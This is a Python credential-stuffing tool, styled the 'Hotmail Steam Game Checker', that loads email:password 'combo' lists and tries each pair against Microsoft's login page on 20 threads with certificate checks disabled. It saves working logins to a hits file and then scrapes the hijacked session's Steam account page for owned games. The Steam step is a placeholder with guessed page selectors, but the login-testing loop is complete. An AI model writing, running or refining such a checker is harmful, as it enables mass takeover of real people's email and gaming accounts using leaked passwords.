import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from bs4 import BeautifulSoup

# Suppress HTTPS warnings
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# ASCII art for Steam Game Checker
ascii_art = """


█▀ ▀█▀ █▀▀ ▄▀█ █▀▄▀█   █▀▀ █░█ █▀▀ █▀▀ █▄▀ █▀▀ █▀█
▄█ ░█░ ██▄ █▀█ █░▀░█   █▄▄ █▀█ ██▄ █▄▄ █░█ ██▄ █▀▄
           Hotmail Steam Game Checker
"""

def check_hotmail_account(email, password, output_file, full_capture_file):
    url = "https://login.live.com/login.srf"
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    data = {
        "login": email,
        "passwd": password,
        "loginfmt": email,
        "type": "11",
        "LoginOptions": "3",
        "i3": "36729",
        "m1": "768",
        "m2": "1184",
        "m3": "0",
        "i12": "1",
        "i17": "0",
        "i18": "__Login_Host|1",
    }
    try:
        session = requests.Session()
        response = session.post(url, headers=headers, data=data, verify=False)

        if response.status_code == 200 and "Sign in" not in response.text:
            print(f"SUCCESS: {email}:{password}")

            # Create a file with email:password format for successful logins
            with open(output_file, "a") as f:
                f.write(f"{email}:{password}\n")

            # Check for Steam game details
            owned_games = check_steam_games(session)
            if owned_games is not None:
                with open(full_capture_file, "a") as fc:
                    fc.write(f"{email}:{password} - Owned Games: {owned_games}\n")
                return "hit"
            else:
                print(f"No Steam Games found for {email}")
                return "bad"
        else:
            print(f"BAD: {email}:{password}")
            return "bad"
    except Exception as e:
        print(f"ERROR: {email}:{password} - {str(e)}")
        return "error"

def check_steam_games(session):
    # Replace with actual logic to check the number of owned games on Steam
    # Example placeholder function
    # This will need to be replaced with the actual Steam API call or web scraping method
    steam_profile_url = "https://store.steampowered.com/account/"
    response = session.get(steam_profile_url, verify=False)
    
    if response.status_code == 200:
        # Use BeautifulSoup to parse the response and find the number of games
        soup = BeautifulSoup(response.text, 'html.parser')
        # Example parsing logic: Adjust according to actual HTML structure
        game_count_element = soup.find('div', {'class': 'game_count'})  # Replace with actual element
        if game_count_element:
            game_count = game_count_element.text.strip()
            return game_count
    return None

def main():
    hits = 0
    bad_attempts = 0
    total_checked = 0

    # Print ASCII art
    print(ascii_art)

    # Input and file handling
    combos_file = input("Enter combos file path: ").strip()
    output_file = input("Enter output file name (e.g., steam_success.txt): ").strip()
    full_capture_file = "steam_full_capture.txt"

    try:
        # Load combos from file
        with open(combos_file, "r") as f:
            combos = f.read().strip().splitlines()

        total_checked = len(combos)
        print(f"Loaded {total_checked} combos.")

        # Use ThreadPoolExecutor to parallelize the checking process
        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = []
            for combo in combos:
                email, password = combo.split(":")
                future = executor.submit(check_hotmail_account, email, password, output_file, full_capture_file)
                futures.append((future, email, password))  # Store future and combo details

            for future, email, password in futures:
                result = future.result()
                if result == "hit":
                    hits += 1
                elif result == "bad":
                    bad_attempts += 1
                elif result == "error":
                    # Retry the combo if there was an error
                    print(f"Retrying {email}:{password}...")
                    future = executor.submit(check_hotmail_account, email, password, output_file, full_capture_file)
                    result = future.result()
                    if result == "hit":
                        hits += 1
                    elif result == "bad":
                        bad_attempts += 1

    except FileNotFoundError:
        print(f"Error: File '{combos_file}' not found.")
    except Exception as ex:
        print(f"Error: {str(ex)}")

    # Print summary
    print("\n---- Summary ----")
    print(f"Hits: {hits}")
    print(f"Bad Attempts: {bad_attempts}")
    print(f"Total Checked: {total_checked}")

if __name__ == "__main__":
    main()
